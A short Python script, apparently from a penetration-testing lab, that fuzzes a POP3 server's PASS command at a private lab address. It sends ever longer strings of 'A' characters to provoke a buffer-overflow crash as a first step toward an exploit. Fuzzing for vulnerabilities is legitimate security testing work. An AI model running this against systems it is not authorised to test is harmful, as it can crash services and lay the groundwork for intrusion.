#!/usr/bin/env python
import socket, sys

if __name__ == '__main__':

	buff = ['A']
	counter = 100

	while len(buff) <= 30:
		buff.append("A" * counter)
		counter += 200

	for string in buff:
		print("Fuzzing PASS with {0} bytes...".format(str(len(string))))

		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock_conn = sock.connect(('10.11.21.97', 110))
		data = sock.recv(1024)
		print data

		sock.send("USER test\r\n")
		data = sock.recv(1024)
		print data

		sock.send("PASS {0}\r\n".format(string))
		data = sock.recv(1024)
		print data

		sock.close()

	sys.exit(0)
